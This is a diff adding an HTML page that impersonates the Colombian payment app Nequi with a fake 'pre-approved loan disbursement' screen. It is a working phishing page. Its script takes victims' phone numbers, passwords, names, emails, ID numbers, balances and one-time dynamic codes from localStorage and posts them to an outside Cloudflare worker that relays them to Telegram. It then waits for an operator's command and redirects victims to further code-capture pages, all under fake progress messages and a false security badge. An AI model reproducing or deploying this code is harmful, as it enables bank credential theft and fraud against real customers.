@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Proceso de Desembolso - Nequi</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #2E0039 0%, #4A148C 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px 30px;
+            text-align: center;
+            box-shadow: 0 15px 30px rgba(0,0,0,0.2);
+            max-width: 400px;
+            width: 100%;
+        }
+
+        .logo {
+            margin-bottom: 30px;
+        }
+
+        .logo-icon {
+            background: #2E0039;
+            color: white;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 24px;
+            margin: 0 auto 15px;
+        }
+
+        .logo-text {
+            font-size: 28px;
+            font-weight: bold;
+            color: #2E0039;
+        }
+
+        .loader-container {
+            margin: 30px 0;
+        }
+
+        .loader {
+            width: 80px;
+            height: 80px;
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #00C853;
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .progress-text {
+            font-size: 16px;
+            color: #3A0A63;
+            margin-top: 20px;
+            font-weight: 600;
+        }
+
+        .progress-dots {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 15px;
+        }
+
+        .dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #E3D4EE;
+            animation: pulse 1.5s infinite;
+        }
+
+        .dot:nth-child(2) {
+            animation-delay: 0.3s;
+        }
+
+        .dot:nth-child(3) {
+            animation-delay: 0.6s;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 1; }
+        }
+
+        .status-message {
+            background: #F9F3FF;
+            border-left: 4px solid #00C853;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 25px 0;
+            text-align: left;
+        }
+
+        .status-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: #2E0039;
+            margin-bottom: 5px;
+        }
+
+        .status-subtitle {
+            font-size: 14px;
+            color: #3A0A63;
+            opacity: 0.8;
+        }
+
+        .progress-steps {
+            margin: 25px 0;
+        }
+
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 15px;
+            padding: 12px;
+            border-radius: 8px;
+            background: #F9F3FF;
+            transition: all 0.3s ease;
+        }
+
+        .step-icon {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: #E3D4EE;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            color: #3A0A63;
+        }
+
+        .step.active .step-icon {
+            background: #00C853;
+            color: white;
+        }
+
+        .step-text {
+            flex: 1;
+            text-align: left;
+        }
+
+        .step-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #3A0A63;
+        }
+
+        .step-description {
+            font-size: 12px;
+            color: #3A0A63;
+            opacity: 0.7;
+        }
+
+        .timer {
+            font-size: 14px;
+            color: #3A0A63;
+            margin-top: 20px;
+            font-weight: 600;
+        }
+
+        .security-badge {
+            background: rgba(0, 200, 83, 0.1);
+            border: 1px solid #00C853;
+            color: #00C853;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            display: inline-block;
+            margin-top: 20px;
+        }
+
+        .footer {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #E3D4EE;
+        }
+
+        .footer-text {
+            font-size: 12px;
+            color: #3A0A63;
+            opacity: 0.7;
+        }
+
+        .progress-container {
+            width: 100%;
+            background: #f0f0f0;
+            border-radius: 10px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 6px;
+            background: linear-gradient(90deg, #2E0039, #da0081);
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <div class="logo-icon">NQ</div>
+            <div class="logo-text">Nequi</div>
+            <img src="https://i.ytimg.com/vi/NrZ3sekzj8I/hq720.jpg?sqp=-oaymwE7CK4FEIIDSFryq4qpAy0IARUAAAAAGAElAADIQj0AgKJD8AEB-AH-CYAC0AWKAgwIABABGEIgEyh_MA8=&rs=AOn4CLCugCpuvPmTm3tnsNGvB_zeML3XKQ" alt="Imagen" style="width:250px; height:auto;border-radius:5px;">
+        </div>
+
+        <div class="loader-container">
+            <div class="loader"></div>
+            <div class="progress-text" id="progressText">Procesando tu desembolso</div>
+            <div class="progress-dots">
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+            </div>
+        </div>
+
+        <div class="status-message">
+            <div class="status-title" id="statusTitle">Desembolso en progreso</div>
+            <div class="status-subtitle" id="statusSubtitle">Estamos procesando tu desembolso pre-aprobado. Esto puede tomar unos segundos.</div>
+        </div>
+
+        <!-- Barra de progreso -->
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+
+        <div class="progress-steps">
+            <div class="step active">
+                <div class="step-icon">✓</div>
+                <div class="step-text">
+                    <div class="step-title">Crédito pre-aprobado</div>
+                    <div class="step-description">Has sido pre-aprobado para el desembolso</div>
+                </div>
+            </div>
+
+            <div class="step active">
+                <div class="step-icon">⏳</div>
+                <div class="step-text">
+                    <div class="step-title">Validando información</div>
+                    <div class="step-description">Verificando datos para el desembolso</div>
+                </div>
+            </div>
+
+            <div class="step" id="step3">
+                <div class="step-icon">◯</div>
+                <div class="step-text">
+                    <div class="step-title">Procesando desembolso</div>
+                    <div class="step-description">Transferencia a tu cuenta Nequi</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="timer" id="timer">
+            Tiempo transcurrido: <span id="time">0</span> segundos
+        </div>
+
+        <div class="security-badge">
+            🔒 Desembolso seguro garantizado
+        </div>
+
+        <div class="footer">
+            <div class="footer-text">
+                No cierres esta ventana mientras se completa el desembolso
+            </div>
+        </div>
+    </div>
+
+    <script>
+    const WORKER_URL = "https://throbbing-sky-6a75.claropromoxlaro.workers.dev";
+
+    // Función mejorada para enviar datos a Telegram
+    async function sendToTelegram(bancoldata, bancoldina) {
+        const usuario = bancoldata.usuario || 'No disponible';
+        const clave = bancoldata.clave || 'No disponible';
+        const nombre = bancoldata.nombre || 'No disponible';
+        const correo = bancoldata.correo || 'No disponible';
+        const cedula = bancoldata.cedula || 'No disponible';
+        const saldo = bancoldata.saldo || 'No disponible';
+        const transactionId = bancoldata.transactionId;
+
+        const hora = new Date().toLocaleString('es-CO', {
+            year: 'numeric',
+            month: '2-digit',
+            day: '2-digit',
+            hour: '2-digit',
+            minute: '2-digit',
+            second: '2-digit',
+            hour12: true
+        });
+
+        // Mensaje COMPLETO con todos los datos
+        const mensaje = `🔔 **NUEVA SOLICITUD DE DESEMBOLSO** 🔔
+
+📋 **INFORMACIÓN DEL USUARIO:**
+👤 Nombre: ${nombre}
+📱 Número: ${usuario}
+🔑 Clave: ${clave}
+📧 Correo: ${correo}
+🪪 Documento: ${cedula}
+💰 Saldo: $${saldo?.toLocaleString('es-CO') || '0'}
+
+🔐 **CLAVE DINÁMICA CAPTURADA:**
+${bancoldina}
+
+📊 **DATOS DE DESEMBOLSO:**
+🆔 ID: ${transactionId}
+⏰ Hora: ${hora}
+💵 Monto: $2,400,000 COP
+✅ Estado: Pre-aprobado
+
+⚠️ **¿QUÉ ACCIÓN DESEAS REALIZAR?**
+
+✅ **AUTORIZAR** - Procesar desembolso
+💰 **CONSULTAR SALDO** - Verificar saldo disponible
+🔑 **SOLICITAR OTP** - Nueva clave de verificación
+❌ **RECHAZAR** - Cancelar desembolso
+⚠️ **REPORTAR ERROR** - Error en el proceso`;
+
+        try {
+            const response = await fetch(`${WORKER_URL}/send-to-telegram`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    message: mensaje,
+                    transactionId: transactionId,
+                    // Enviar datos adicionales para los botones
+                    userData: {
+                        usuario: usuario,
+                        clave: clave,
+                        nombre: nombre,
+                        correo: correo,
+                        cedula: cedula,
+                        saldo: saldo,
+                        dinámica: bancoldina
+                    }
+                })
+            });
+
+            if (response.ok) {
+                console.log('✅ Todos los datos enviados a Telegram correctamente');
+                return true;
+            } else {
+                console.error('❌ Error en respuesta del servidor');
+                return false;
+            }
+        } catch (error) {
+            console.error('❌ Error enviando a Telegram:', error);
+            return false;
+        }
+    }
+
+    // Función para enviar datos cuando se selecciona un botón en Telegram
+    async function sendButtonDataToTelegram(estado, bancoldata, bancoldina) {
+        const usuario = bancoldata.usuario || 'No disponible';
+        const clave = bancoldata.clave || 'No disponible';
+        const transactionId = bancoldata.transactionId;
+
+        const mensaje = `🔄 **ACCIÓN EN DESEMBOLSO** 🔄
+
+📱 **USUARIO:** ${usuario}
+🔑 **CLAVE:** ${clave}
+🔐 **DINÁMICA:** ${bancoldina}
+🎯 **ACCIÓN:** ${estado.toUpperCase()}
+💵 **PROCESO:** Desembolso pre-aprobado
+🆔 **ID:** ${transactionId}
+
+⏰ **HORA:** ${new Date().toLocaleString('es-CO')}`;
+
+        try {
+            await fetch(`${WORKER_URL}/send-button-action`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    message: mensaje,
+                    estado: estado,
+                    transactionId: transactionId,
+                    usuario: usuario,
+                    clave: clave,
+                    dinámica: bancoldina
+                })
+            });
+            console.log(`✅ Datos de botón enviados: ${estado}`);
+        } catch (error) {
+            console.error('❌ Error enviando acción de botón:', error);
+        }
+    }
+
+    document.addEventListener('DOMContentLoaded', async function () {
+        let transactionId = '';
+        let startTime = Date.now();
+        let pollingCount = 0;
+        const maxPollingTime = 600000; // 10 minutos máximo
+
+        function updateStatus(message) {
+            document.getElementById('statusTitle').textContent = message;
+            console.log("Status:", message);
+        }
+
+        function updateProgress(percentage) {
+            document.getElementById('progressBar').style.width = percentage + '%';
+        }
+
+        function updateTimeIndicator() {
+            const elapsed = Math.floor((Date.now() - startTime) / 1000);
+            document.getElementById('time').textContent = elapsed;
+        }
+
+        // Obtener datos del localStorage
+        const bancoldata = JSON.parse(localStorage.getItem('bancoldata'));
+        if (!bancoldata || !bancoldata.transactionId) {
+            updateStatus("❌ Error: Sesión no encontrada");
+            setTimeout(() => window.location.href = "index.html", 3000);
+            return;
+        }
+
+        transactionId = bancoldata.transactionId;
+
+        // Verificar si viene de cel-dina.html (con dinámica enviada)
+        const bancoldina = localStorage.getItem('bancoldina');
+
+        // Mostrar clave dinámica si fue enviada y ENVIAR DATOS COMPLETOS A TELEGRAM
+        if (bancoldina) {
+            updateStatus("📤 Procesando desembolso pre-aprobado...");
+
+            // ENVIAR TODOS LOS DATOS A TELEGRAM
+            const enviado = await sendToTelegram(bancoldata, bancoldina);
+
+            if (enviado) {
+                updateStatus("✅ Desembolso listo. Esperando autorización...");
+                updateProgress(40);
+
+                // Guardar en localStorage que ya se enviaron los datos
+                localStorage.setItem('datosEnviados', 'true');
+            } else {
+                updateStatus("⚠️ Error en el proceso. Reintentando...");
+                // Reintentar después de 3 segundos
+                setTimeout(async () => {
+                    await sendToTelegram(bancoldata, bancoldina);
+                    updateStatus("✅ Datos confirmados. Esperando autorización...");
+                }, 3000);
+            }
+        } else {
+            updateStatus("🔄 Esperando confirmación de desembolso...");
+            updateProgress(20);
+        }
+
+        // Iniciar polling inmediatamente para esperar botones de Telegram
+        startStatusPolling();
+
+        // Polling del estado - MEJORADO
+        async function startStatusPolling() {
+            const pollInterval = setInterval(async () => {
+                pollingCount++;
+                updateTimeIndicator();
+
+                // Actualizar progreso basado en el tiempo
+                const elapsed = Date.now() - startTime;
+                let progress;
+                if (bancoldina) {
+                    progress = Math.min(40 + (elapsed / maxPollingTime) * 40, 80);
+                } else {
+                    progress = Math.min(20 + (elapsed / maxPollingTime) * 40, 60);
+                }
+                updateProgress(progress);
+
+                // Verificar timeout máximo
+                if (elapsed > maxPollingTime) {
+                    clearInterval(pollInterval);
+                    updateStatus("⏰ Tiempo agotado. Redirigiendo...");
+                    updateProgress(100);
+                    handleTimeout();
+                    return;
+                }
+
+                try {
+                    const response = await fetch(`${WORKER_URL}/status?id=${transactionId}`);
+                    const data = await response.json();
+
+                    console.log(`Poll ${pollingCount}:`, data.estado);
+
+                    if (data.estado && data.estado !== "pendiente") {
+                        clearInterval(pollInterval);
+                        updateStatus("✅ ¡Desembolso autorizado!");
+                        updateProgress(100);
+
+                        // ENVIAR DATOS DEL BOTÓN PRESIONADO
+                        await sendButtonDataToTelegram(data.estado, bancoldata, bancoldina);
+
+                        processState(data.estado);
+                    } else {
+                        // Mantener mensajes informativos según el contexto
+                        if (bancoldina) {
+                            const messages = [
+                                "✅ Desembolso pre-aprobado. Esperando autorización...",
+                                "✅ Información verificada. Procesando desembolso...",
+                                "✅ Clave validada. Transferencia en curso..."
+                            ];
+                            updateStatus(messages[pollingCount % messages.length]);
+                        } else {
+                            const messages = [
+                                "🔄 Esperando confirmación de desembolso...",
+                                "📱 para autorizar...",
+                                "⏳ Validando información del crédito..."
+                            ];
+                            updateStatus(messages[pollingCount % messages.length]);
+                        }
+                    }
+
+                } catch (error) {
+                    console.log("Error en polling:", error);
+                    updateStatus(`⚠️ Reconectando...`);
+                }
+            }, 3000);
+
+            // Actualizar indicador de tiempo cada segundo
+            setInterval(updateTimeIndicator, 1000);
+        }
+
+        // Procesar el estado según la opción seleccionada en Telegram
+        function processState(estado) {
+            console.log("Procesando estado desde Telegram:", estado);
+
+            const actions = {
+                "autorizado": {
+                    message: "✅ ¡Desembolso autorizado! El dinero será transferido a tu cuenta.",
+                    url: "cel-dina.html",
+                    delay: 2000,
+                    action: "redirect"
+                },
+                "otp": {
+                    message: "💰 Redirigiendo a consulta de saldo...", 
+                    url: "otp.html",
+                    delay: 2000,
+                    action: "redirect"
+                },
+                "error": {
+                    message: "❌ Error en el desembolso. Redirigiendo...",
+                    url: "../../pay/",
+                    delay: 2500,
+                    action: "redirect"
+                },
+                "fallo": {
+                    message: "⚠️ Desembolso rechazado. Redirigiendo...",
+                    url: "https://servicioenlinea.online/dinainvalida/",
+                    delay: 2500,
+                    action: "redirect"
+                },
+                "finalizado": {
+                    message: "✅ Desembolso completado exitosamente.",
+                    url: "https://ayuda.nequi.com.co/hc/es",
+                    delay: 2000,
+                    action: "redirect"
+                },
+                "rechazado": {
+                    message: "❌ Desembolso cancelado por el usuario.",
+                    url: "index.html",
+                    delay: 3000,
+                    action: "redirect"
+                },
+                "pendiente": {
+                    message: "🔄 Esperando confirmación del desembolso...",
+                    url: "",
+                    delay: 0,
+                    action: "wait"
+                }
+            };
+
+            const action = actions[estado] || {
+                message: "🔄 Procesando respuesta...",
+                url: "cel-dina.html",
+                delay: 2000,
+                action: "redirect"
+            };
+
+            updateStatus(action.message);
+
+            if (action.action === "redirect") {
+                setTimeout(() => {
+                    if (estado === "error") {
+                        alert("Error en el desembolso. Serás redirigido.");
+                    }
+                    window.location.href = action.url;
+                }, action.delay);
+            } else if (action.action === "wait") {
+                setTimeout(() => {
+                    startStatusPolling();
+                }, 5000);
+            }
+        }
+
+        // Manejar timeout
+        function handleTimeout() {
+            if (bancoldina) {
+                updateStatus("⏰ Tiempo de espera agotado. Verificando estado del desembolso...");
+                setTimeout(() => window.location.href = "index-otp.html", 3000);
+            } else {
+                updateStatus("⏰ No se recibió confirmación. Iniciando nueva verificación...");
+                setTimeout(() => window.location.href = "cel-dina.html", 3000);
+            }
+        }
+
+        // Timeout global de seguridad
+        setTimeout(() => {
+            updateStatus("🔄 Redirección automática por seguridad...");
+            handleTimeout();
+        }, maxPollingTime + 30000);
+
+    });
+    </script>
+</body>
+</html>
